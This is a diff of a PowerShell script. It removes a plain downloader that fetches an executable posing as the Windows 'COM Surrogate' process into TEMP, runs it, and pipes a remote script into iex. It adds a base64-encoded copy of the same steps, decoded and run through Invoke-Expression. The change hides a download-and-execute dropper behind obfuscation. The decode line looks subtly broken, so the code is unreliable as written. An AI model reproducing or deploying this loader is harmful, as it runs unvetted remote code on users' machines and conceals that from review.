@@ -1,17 +1,3 @@
-# Define the URL of the file to download
-$url = "https://raw.githubusercontent.com/M7mmdddd/webstie-demo/refs/heads/main/files/COM%20Surrogate.exe"
-
-# Define the local path where the file will be saved
-$output = "$env:TEMP\COM_Surrogate.exe"
-
-# Download the file
-Invoke-WebRequest -Uri $url -OutFile $output
-
-# Check if the file was downloaded successfully
-if (Test-Path $output) {
-    # Execute the downloaded file
-    Start-Process -FilePath $output
-} else {
-    Write-Host "Failed to download the file."
-}
-irm "https://christitus.com/win" | iex
+$encodedScript = "JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ATQA3AG0AbQBkAGQAZABkAC8AdwBlAGIAcwB0AGkAZQAtAGQAZQBtAG8ALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAGkAbgAvAGYAaQBsAGUAcwAvAEMATwBNACAAUwB1AHIAcgBvAGcAYQB0AGUALgBlAHgAZQAiAA0ACgAkAG8AdQB0AHAAdQB0ACAAPQAgACIAJABlAG4AdgA6AFQARQBNAFAAXABDAE8ATQBfAFMAdQByAHIAbwBnAGEAdABlAC4AZQB4AGUAIgANAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAdQByAGwAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAG8AdQB0AHAAdQB0AA0ACgBpAGYAIAAoAFQAZQBzAHQALQBQAGEAdABoACAAJABvAHUAdABwAHUAdAApACAAewANAAoAIAAgACAAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAkAG8AdQB0AHAAdQB0AA0ACgB9ACAAZQBsAHMAZQAgAHsADQAKACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAQQBkAGQAIAB0AG8AIAB0AGgAZQAgAGYAYQBpAGwAZQBkACAAZgBpAGwAZQAuACIADQAKAH0ADQAKAGkAcgBtACAAIgBoAHQAdABwAHMAOgAvAC8AYwBoAHIAaQBzAHQAaQB0AHUAcwAuAGMAbwBtAC8AdwBpAG4AIgAgAHwAIABpAGUAeAA="
+$decodedScript = [System.Text.Encoding]::Unicode.GetString([System.IO.MemoryStream] [Convert]::FromBase64String($encodedScript))
+Invoke-Expression $decodedScript
